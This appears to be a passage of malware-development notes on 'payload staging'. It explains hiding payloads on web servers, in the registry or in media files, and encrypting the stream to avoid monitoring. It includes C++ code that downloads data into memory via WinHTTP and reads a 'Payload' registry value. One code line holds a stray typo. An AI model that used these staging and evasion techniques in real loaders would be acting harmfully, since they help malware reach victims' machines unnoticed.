### Payload staging

Simply, keeping payload at accessible but "not within the code" location. Examples: Web Server, Windows Registry, Some local files(movies, game-files, etc.), etc. While loading care must be taken to have the stream encrypted, since the streams(web-connection, file streams, etc) are monitored.

```cpp
// Example: Downloading a payload from web-server to memory
#include <windows.h>
#include <winhttp.h>
#include <vector>
#include <iostream>

using namespace std;

#pragma comment(lib, "winhttp.lib")

vector<char> downloadToMemory(const wchar_t* url) {
    vector<char> data;

    URL_COMPONENTS urlComp = { sizeof(urlComp) };
    wchar_t hostName[256];
    wchar_t urlPath[1024];
    urlComp.lpszHostName = hostName;
    urlComp.dwHostNameLength = _countof(hostName);
    urlComp.lpszUrlPath = urlPath;
    urlComp.dwUrlPathLength = _countof(urlPath);

    if (!WinHttpCrackUrl(url, 0, 0, &urlComp))
        throw runtime_error("Invalid URL");

    HINTERNET hSession = WinHttpOpen(L"C++ Downloader",
                                     WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,a
                                     WINHTTP_NO_PROXY_NAME,
                                     WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) throw runtime_error("WinHttpOpen failed");

    HINTERNET hConnect = WinHttpConnect(hSession, hostName, urlComp.nPort, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); throw runtime_error("WinHttpConnect failed"); }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", urlPath,
                                            NULL, WINHTTP_NO_REFERER,
                                            WINHTTP_DEFAULT_ACCEPT_TYPES,
                                            (urlComp.nScheme == INTERNET_SCHEME_HTTPS) ? WINHTTP_FLAG_SECURE : 0);

    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        throw runtime_error("WinHttpOpenRequest failed");
    }

    BOOL bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                       WINHTTP_NO_REQUEST_DATA, 0, 0, 0)
                    && WinHttpReceiveResponse(hRequest, NULL);

    if (bResults) {
        DWORD dwSize = 0;
        do {
            WinHttpQueryDataAvailable(hRequest, &dwSize);
            if (!dwSize) break;

            vector<char> buffer(dwSize);
            DWORD dwDownloaded = 0;
            if (!WinHttpReadData(hRequest, buffer.data(), dwSize, &dwDownloaded))
                break;
            data.insert(data.end(), buffer.begin(), buffer.begin() + dwDownloaded);
        } while (dwSize > 0);
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    if (!bResults)
        throw runtime_error("HTTP request failed");

    return data;
}

int main() {
    try {
        auto data = downloadToMemory(L"https://example.com");
        cout << "Downloaded " << data.size() << " bytes\n";
    } catch (const exception& e) {
        cerr << e.what() << '\n';
    }
}

// Loading from windows registry can be done using RegGetValue or RegQueryValueEx functions.
void loadFromRegistryExample() {
    HKEY hKey;
    if (RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\MyApp", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        DWORD dataSize = 0;
        if (RegQueryValueEx(hKey, L"Payload", NULL, NULL, NULL, &dataSize) == ERROR_SUCCESS) {
            vector<BYTE> data(dataSize);
            if (RegQueryValueEx(hKey, L"Payload", NULL, NULL, data.data(), &dataSize) == ERROR_SUCCESS) {
                // Use the payload data
            }
        }
        RegCloseKey(hKey);
    }
}
```